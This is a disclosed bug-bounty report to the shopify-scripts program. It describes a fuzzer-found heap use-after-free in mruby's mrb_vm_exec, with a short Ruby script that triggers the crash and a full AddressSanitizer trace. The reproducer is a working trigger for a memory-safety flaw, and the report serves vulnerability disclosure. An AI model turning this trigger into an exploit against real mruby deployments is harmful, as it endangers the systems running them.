# Heap use-after-free in mrb_vm_exec 

## Report Details
- **Report ID**: 207710
- **URL**: https://hackerone.com/reports/207710
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-02-20T17:27:16.578Z
- **Disclosed**: 2017-04-13T21:10:04.591Z

## Reporter
- **Username**: mg36
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Here is an invalid memory manipulation I discover by doing some fuzzing,

The code that triggers the bug :
```
def t()
end

def na0e
end

def artist
k 10000
end

class S0n0
def inspect
super@n=na0e
    @r=artist
end

end
S0n0.new.inspect
```

The crash report using AddressSanitizer:
```
./mruby HEAP.rb
=================================================================
==44459==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d000001230 at pc 0x0000005bc298 bp 0x7ffc9e6f6350 sp 0x7ffc9e6f6348
WRITE of size 8 at 0x61d000001230 thread T0
    #0 0x5bc297 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1422:28
    #1 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13
    #2 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10
    #3 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12
    #4 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3
    #5 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18
    #6 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13
    #7 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10
    #8 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12
    #9 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3
    #10 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18
    #11 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13
    #12 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10
    #13 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12
    #14 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3
    #15 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18
    #16 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13
    #17 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10
    #18 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12
    #19 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3
    #20 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18
    #21 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13
    #22 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10
    #23 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12
    #24 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3
    #25 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18
    #26 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13
    #27 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10
    #28 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12
    #29 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3
    #30 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18
    #31 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13
    #32 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10
    #33 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12
    #34 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3
    #35 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18
    #36 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13
    #37 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10
    #38 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12
    #39 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3
    #40 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18
    #41 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13
    #42 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10
    #43 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12
    #44 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3
    #45 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18
    #46 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13
    #47 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10
    #48 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12
    #49 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3
    #50 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18
    #51 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13
    #52 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10
    #53 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12
    #54 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3
    #55 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18
    #56 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13
    #57 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10
    #58 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12
    #59 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3
    #60 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18
    #61 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13
    #62 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10
    #63 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12
    #64 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3
    #65 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18
    #66 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13
    #67 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10
    #68 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12
    #69 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3
    #70 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18
    #71 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13
    #72 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10
    #73 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12
    #74 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3
    #75 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18
    #76 0x5c23b4 in mrb_vm_run /home/simo/test/news/mruby/src/vm.c:815:10
    #77 0x5c23b4 in mrb_top_run /home/simo/test/news/mruby/src/vm.c:2569
    #78 0x6f37ec in mrb_load_exec /home/simo/test/news/mruby/mrbgems/mruby-compiler/core/parse.y:5755:7
    #79 0x4ed69a in main /home/simo/test/news/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
    #80 0x7f4289cb582f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291
    #81 0x41a0e8 in _start (/home/simo/test/news/mruby/bin/mruby+0x41a0e8)

0x61d000001230 is located 1968 bytes inside of 2048-byte region [0x61d000000a80,0x61d000001280)
freed by thread T0 here:
    #0 0x4c0c7e in realloc (/home/simo/test/news/mruby/bin/mruby+0x4c0c7e)
    #1 0x507e7a in mrb_realloc_simple /home/simo/test/news/mruby/src/gc.c:201:8
    #2 0x507e7a in mrb_realloc /home/simo/test/news/mruby/src/gc.c:215

previously allocated by thread T0 here:
    #0 0x4c0c7e in realloc (/home/simo/test/news/mruby/bin/mruby+0x4c0c7e)
    #1 0x507e7a in mrb_realloc_simple /home/simo/test/news/mruby/src/gc.c:201:8
    #2 0x507e7a in mrb_realloc /home/simo/test/news/mruby/src/gc.c:215

SUMMARY: AddressSanitizer: heap-use-after-free /home/simo/test/news/mruby/src/vm.c:1422:28 in mrb_vm_exec
Shadow bytes around the buggy address:
  0x0c3a7fff81f0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fff8200: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fff8210: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fff8220: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fff8230: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x0c3a7fff8240: fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd
  0x0c3a7fff8250: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fff8260: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fff8270: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fff8280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fff8290: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==44459==ABORTING
```

Regards


## Attachments
No attachments
